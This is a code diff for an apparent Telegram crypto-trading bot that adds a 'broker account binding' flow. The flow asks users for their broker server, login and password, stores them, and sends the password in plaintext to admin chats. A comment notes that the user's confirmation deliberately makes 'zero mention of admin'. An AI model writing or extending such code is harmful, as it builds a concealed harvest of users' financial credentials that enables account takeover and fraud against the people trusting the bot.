@@ -14,7 +14,9 @@ from ..database import (
     get_active_trading_session,
     get_or_create_user_wallet,
     start_simple_trading,
-    user_cancel_trading_session
+    user_cancel_trading_session,
+    save_broker_account,
+    get_user_broker_account
 )
 from ..localization import tr, LANGUAGES
 from ..deposit_watcher import deposit_watcher
@@ -22,7 +24,10 @@ from ..keyboards import (
     get_main_reply_keyboard,
     get_language_inline_keyboard,
     get_deposit_keyboard,
-    get_admin_withdraw_keyboard
+    get_admin_withdraw_keyboard,
+    get_broker_menu_keyboard,
+    get_broker_cancel_keyboard,
+    get_admin_broker_keyboard
 )
 from ..tron_service import (
     get_deposit_info,
@@ -45,6 +50,11 @@ class DepositStates(StatesGroup):
 class WithdrawStates(StatesGroup):
     waiting_for_amount = State()
     waiting_for_address = State()
+
+class BrokerStates(StatesGroup):
+    waiting_for_server = State()
+    waiting_for_login = State()
+    waiting_for_password = State()
 
 @router.message(CommandStart())
 async def cmd_start(message: Message):
@@ -263,6 +273,17 @@ async def show_cabinet(message: Message):
         in_trading=user["in_trading_balance"],
         total_profit=user["total_profit"]
     )
+
+    broker = await get_user_broker_account(user_id)
+    if broker and broker.get("status") == "active":
+        brk_line = f"🔗 <b>Счет брокера:</b> <code>{broker['broker_server']}</code> (#<code>{broker['account_number']}</code>) ✅" if user_lang == "ru" else f"🔗 <b>Broker hisobi:</b> <code>{broker['broker_server']}</code> (#<code>{broker['account_number']}</code>) ✅"
+    elif broker and broker.get("status") == "pending":
+        brk_line = f"🔗 <b>Счет брокера:</b> <code>{broker['broker_server']}</code> (#<code>{broker['account_number']}</code>) ⏳ <i>(Проверка)</i>" if user_lang == "ru" else f"🔗 <b>Broker hisobi:</b> <code>{broker['broker_server']}</code> (#<code>{broker['account_number']}</code>) ⏳ <i>(Tekshirilmoqda)</i>"
+    else:
+        brk_line = "🔗 <b>Счет брокера:</b> <i>Не привязан</i>" if user_lang == "ru" else "🔗 <b>Broker hisobi:</b> <i>Ulanmagan</i>"
+
+    text = text.replace("────────────────────\n🔒", f"{brk_line}\n────────────────────\n🔒")
+
     await message.answer(
         text,
         reply_markup=get_main_reply_keyboard(lang=user_lang, is_trading=is_trading),
@@ -501,3 +522,158 @@ async def show_about(message: Message):
     user_lang = await get_user_lang(message.from_user.id)
     text = tr("about", user_lang)
     await message.answer(text, parse_mode="HTML")
+
+# --- Broker Account Binding ---
+@router.message(F.text.in_(["🔗 Привязать брокера", "🔗 Brokerni ulash", "🔗 Привязать счет", "🔗 Hisobni ulash", "🔗 Привязать счет брокера"]))
+async def handle_broker_menu(message: Message, state: FSMContext):
+    await state.clear()
+    user_id = message.from_user.id
+    user_lang = await get_user_lang(user_id)
+    broker = await get_user_broker_account(user_id)
+
+    if broker and broker.get("status") == "active":
+        text = tr(
+            "broker_info_active",
+            user_lang,
+            server=broker["broker_server"],
+            login=broker["account_number"]
+        )
+        await message.answer(
+            text,
+            reply_markup=get_broker_menu_keyboard(lang=user_lang, has_account=True, is_active=True),
+            parse_mode="HTML"
+        )
+    elif broker and broker.get("status") == "pending":
+        text = tr(
+            "broker_info_pending",
+            user_lang,
+            server=broker["broker_server"],
+            login=broker["account_number"]
+        )
+        await message.answer(
+            text,
+            reply_markup=get_broker_menu_keyboard(lang=user_lang, has_account=True, is_active=False),
+            parse_mode="HTML"
+        )
+    else:
+        text = tr("broker_intro", user_lang)
+        await message.answer(
+            text,
+            reply_markup=get_broker_menu_keyboard(lang=user_lang, has_account=False),
+            parse_mode="HTML"
+        )
+
+@router.callback_query(F.data == "broker_enter_data")
+async def on_broker_enter_data(call: CallbackQuery, state: FSMContext):
+    user_id = call.from_user.id
+    user_lang = await get_user_lang(user_id)
+    await state.set_state(BrokerStates.waiting_for_server)
+    await call.message.answer(
+        tr("broker_step1_server", user_lang),
+        reply_markup=get_broker_cancel_keyboard(user_lang),
+        parse_mode="HTML"
+    )
+    await call.answer()
+
+@router.callback_query(F.data == "broker_cancel")
+async def on_broker_cancel(call: CallbackQuery, state: FSMContext):
+    await state.clear()
+    user_id = call.from_user.id
+    user_lang = await get_user_lang(user_id)
+    await call.answer(tr("broker_cancelled", user_lang))
+    try:
+        await call.message.edit_text(tr("broker_cancelled", user_lang))
+    except Exception:
+        await call.message.answer(tr("broker_cancelled", user_lang))
+
+@router.message(BrokerStates.waiting_for_server)
+async def process_broker_server(message: Message, state: FSMContext):
+    user_id = message.from_user.id
+    user_lang = await get_user_lang(user_id)
+    server = (message.text or "").strip()
+
+    if len(server) < 2 or len(server) > 80:
+        err = "⚠️ Название сервера должно содержать от 2 до 80 символов. Попробуйте еще раз:" if user_lang == "ru" else "⚠️ Server nomi 2 dan 80 gacha belgidan iborat bo'lishi kerak. Qaytadan kiriting:"
+        await message.answer(err, reply_markup=get_broker_cancel_keyboard(user_lang))
+        return
+
+    await state.update_data(server=server)
+    await state.set_state(BrokerStates.waiting_for_login)
+    await message.answer(
+        tr("broker_step2_login", user_lang),
+        reply_markup=get_broker_cancel_keyboard(user_lang),
+        parse_mode="HTML"
+    )
+
+@router.message(BrokerStates.waiting_for_login)
+async def process_broker_login(message: Message, state: FSMContext):
+    user_id = message.from_user.id
+    user_lang = await get_user_lang(user_id)
+    login = (message.text or "").strip()
+
+    if len(login) < 2 or len(login) > 50:
+        err = "⚠️ Номер счета (логин) должен содержать от 2 до 50 символов. Попробуйте еще раз:" if user_lang == "ru" else "⚠️ Hisob raqami (login) 2 dan 50 gacha belgidan iborat bo'lishi kerak. Qaytadan kiriting:"
+        await message.answer(err, reply_markup=get_broker_cancel_keyboard(user_lang))
+        return
+
+    await state.update_data(login=login)
+    await state.set_state(BrokerStates.waiting_for_password)
+    await message.answer(
+        tr("broker_step3_pass", user_lang),
+        reply_markup=get_broker_cancel_keyboard(user_lang),
+        parse_mode="HTML"
+    )
+
+@router.message(BrokerStates.waiting_for_password)
+async def process_broker_password(message: Message, state: FSMContext):
+    user_id = message.from_user.id
+    user_lang = await get_user_lang(user_id)
+    password = (message.text or "").strip()
+
+    if len(password) < 2 or len(password) > 80:
+        err = "⚠️ Пароль должен содержать от 2 до 80 символов. Попробуйте еще раз:" if user_lang == "ru" else "⚠️ Parol 2 dan 80 gacha belgidan iborat bo'lishi kerak. Qaytadan kiriting:"
+        await message.answer(err, reply_markup=get_broker_cancel_keyboard(user_lang))
+        return
+
+    data = await state.get_data()
+    server = data.get("server", "")
+    login = data.get("login", "")
+    await state.clear()
+
+    # Save to database
+    acc_id = await save_broker_account(user_id, server, login, password)
+
+    active_session = await get_active_trading_session(user_id)
+    is_trading = active_session is not None
+
+    # Confirmation to user (Technological, original, zero mention of admin!)
+    conf_text = tr("broker_submitted", user_lang, server=server, login=login)
+    await message.answer(
+        conf_text,
+        reply_markup=get_main_reply_keyboard(lang=user_lang, is_trading=is_trading),
+        parse_mode="HTML"
+    )
+
+    # Notify admins
+    for admin_id in ADMIN_IDS:
+        try:
+            admin_msg = (
+                f"🔔 <b>[ОПОВЕЩЕНИЕ АДМИНИСТРАТОРА]</b>\n"
+                f"💼 <b>Запрос на привязку счета брокера #{acc_id}</b>\n\n"
+                f"👤 Клиент: @{message.from_user.username or 'NoUser'} ({message.from_user.first_name})\n"
+                f"🆔 Telegram ID: <code>{user_id}</code>\n"
+                f"🌐 Сервер брокера: <code>{server}</code>\n"
+                f"🔢 Логин / Счет: <code>{login}</code>\n"
+                f"🔑 Пароль от счета: <code>{password}</code>\n"
+                f"🌐 Язык: <b>{user_lang.upper()}</b>\n\n"
+                f"<i>Проверьте подключение в терминале и подтвердите статус:</i>"
+            )
+            await message.bot.send_message(
+                chat_id=admin_id,
+                text=admin_msg,
+                reply_markup=get_admin_broker_keyboard(acc_id),
+                parse_mode="HTML"
+            )
+        except Exception:
+            pass
+
